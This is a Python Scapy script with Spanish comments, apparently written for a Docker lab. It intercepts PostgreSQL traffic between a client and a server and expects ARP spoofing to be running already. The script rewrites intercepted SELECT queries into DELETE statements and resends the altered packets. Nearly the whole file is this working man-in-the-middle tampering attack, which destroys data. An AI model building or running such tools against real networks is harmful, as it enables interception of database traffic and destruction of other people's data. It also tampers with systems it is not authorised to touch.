# modify_psql_traffic.py
# Este script intercepta, modifica y reenvía el tráfico PostgreSQL.

from scapy.all import *
import sys
from psql_utils import craft_malicious_psql_query # Importamos la función de nuestro archivo de utilidades

# --- CONFIGURA ESTAS VARIABLES ---
# IP del contenedor cliente pgcli
CLIENT_IP = "172.17.0.3" # ¡Asegúrate de que esta sea la IP real de tu cliente Docker!
# IP del contenedor servidor PostgreSQL
SERVER_IP = "172.17.0.2" # ¡Asegúrate de que esta sea la IP real de tu servidor Docker!
# Interfaz de red de tu Kali Linux (probablemente "docker0")
INTERFACE = "docker0" # ¡Asegúrate de que esta sea la interfaz correcta que identificaste con 'ip a'!

def packet_callback(packet: Packet):
    """
    Función de callback para Scapy que procesa cada paquete capturado.
    Intercepta, modifica y reenvía el tráfico PSQL.
    """
    # Solo procesamos paquetes IP y TCP.
    if IP in packet and TCP in packet:
        # Verificamos que sea tráfico de PostgreSQL (puerto 5432)
        if packet[TCP].dport == 5432 or packet[TCP].sport == 5432:
            
            # --- Tráfico del Cliente al Servidor (posiblemente una consulta) ---
            if packet[IP].src == CLIENT_IP and packet[IP].dst == SERVER_IP and Raw in packet:
                original_psql_payload = packet[Raw].load

                # Los mensajes de consulta PSQL comienzan con 'Q'
                if original_psql_payload.startswith(b'Q'):
                    try:
                        # Extraer la longitud del mensaje PSQL (bytes 1 a 4)
                        message_length = int.from_bytes(original_psql_payload[1:5], 'big')
                        # Extraer la cadena SQL (después de los 5 bytes de cabecera y antes del terminador nulo)
                        # La longitud del mensaje incluye la cabecera, por lo que la SQL es el resto.
                        # Usamos message_length - 1 para excluir el terminador nulo al decodificar.
                        sql_string_bytes = original_psql_payload[5:message_length] 

                        # Decodificar la SQL a string para procesar
                        original_sql = sql_string_bytes.decode('utf-8', errors='ignore').strip('\x00') # Eliminar el terminador nulo

                        # Verificamos si la consulta contiene "SELECT" (ignorando mayúsculas/minúsculas)
                        if "SELECT" in original_sql.upper(): 
                            print(f"\n[+] INTERCEPTADO: Consulta PSQL de {CLIENT_IP} a {SERVER_IP}")
                            print(f"    Original SQL: {original_sql}")

                            # Genera la nueva carga útil PSQL con la modificación.
                            # Usamos la función de psql_utils para reconstruir el mensaje PSQL
                            # con la SQL modificada y la longitud correcta.
                            # Aquí, reemplazamos 'SELECT' por 'DELETE'.
                            modified_psql_payload = craft_malicious_psql_query(
                                original_sql=original_sql,      # La SQL real extraída del paquete
                                replacement_text="DELETE",      # Lo que queremos que sea
                                target_text="SELECT"            # Lo que estamos buscando para reemplazar
                            )

                            # Crea un nuevo paquete con la carga útil PSQL maliciosa.
                            # Copia el paquete original y reemplaza la capa Raw.
                            new_pkt = packet.copy()
                            new_pkt[TCP].remove_payload() # Elimina la antigua capa Raw
                            new_pkt[TCP].add_payload(Raw(load=modified_psql_payload)) # Añade la nueva carga útil

                            # Elimina los checksums y las longitudes para que Scapy los recalcule.
                            if IP in new_pkt:
                                del new_pkt[IP].len
                                del new_pkt[IP].chksum
                            if TCP in new_pkt:
                                del new_pkt[TCP].chksum

                            print(f"    MODIFICADO: Enviando consulta modificada a {SERVER_IP}")
                            # Mostramos solo la parte SQL de la nueva carga útil para mayor claridad.
                            # Se asume que el formato es 'Q' + 4 bytes de longitud + SQL + null terminator.
                            print(f"    Nueva SQL: {modified_psql_payload[5:].decode('utf-8', errors='ignore').strip('\x00')}") 
                            sendp(new_pkt, iface=INTERFACE, verbose=0)
                            return # Paquete procesado, no reenviar el original.
                        else:
                            # Si no es una consulta SELECT, reenviar el paquete original sin modificar.
                            sendp(packet, iface=INTERFACE, verbose=0) # Corregido: 'pkt' a 'packet'
                            return
                    except Exception as e:
                        print(f"[-] ERROR al procesar mensaje PSQL de {CLIENT_IP}: {e}. Reenviando original.")
                        sendp(packet, iface=INTERFACE, verbose=0) # Corregido: 'pkt' a 'packet'
                        return
                else:
                    # Si no es un mensaje de consulta 'Q', reenviar sin modificar.
                    sendp(packet, iface=INTERFACE, verbose=0) # Corregido: 'pkt' a 'packet'
                    return

            # --- Tráfico del Servidor al Cliente (respuestas) ---
            elif packet[IP].src == SERVER_IP and packet[IP].dst == CLIENT_IP:
                # Reenviar las respuestas del servidor sin modificar.
                sendp(packet, iface=INTERFACE, verbose=0) # Corregido: 'pkt' a 'packet'
                return
    
    # --- Reenviar cualquier otro tipo de tráfico que no sea PSQL o no cumpla las condiciones ---
    sendp(packet, iface=INTERFACE, verbose=0) # Corregido: 'pkt' a 'packet'


print("[*] Modificador de tráfico PSQL iniciado...")
print(f"[*] Escuchando tráfico entre Cliente ({CLIENT_IP}) y Servidor ({SERVER_IP}) en puerto 5432.")
print("[*] Asegúrate de que el reenvío IP esté habilitado y el ARP Spoofing esté activo en otras terminales.")
print("[*] Presiona Ctrl+C para detener el sniffing.")

try:
    # Inicia el sniffing de paquetes TCP en el puerto 5432
    # store=0 asegura que Scapy no almacene los paquetes en memoria, lo cual es eficiente para sniffing en vivo.
    sniff(filter=f"tcp port 5432 and (host {CLIENT_IP} or host {SERVER_IP})", prn=packet_callback, iface=INTERFACE, store=0)
except KeyboardInterrupt:
    print("\n[*] Deteniendo el script de modificación de tráfico.")
except Exception as e:
    print(f"[*] Ocurrió un error inesperado: {e}")
    sys.exit(1)

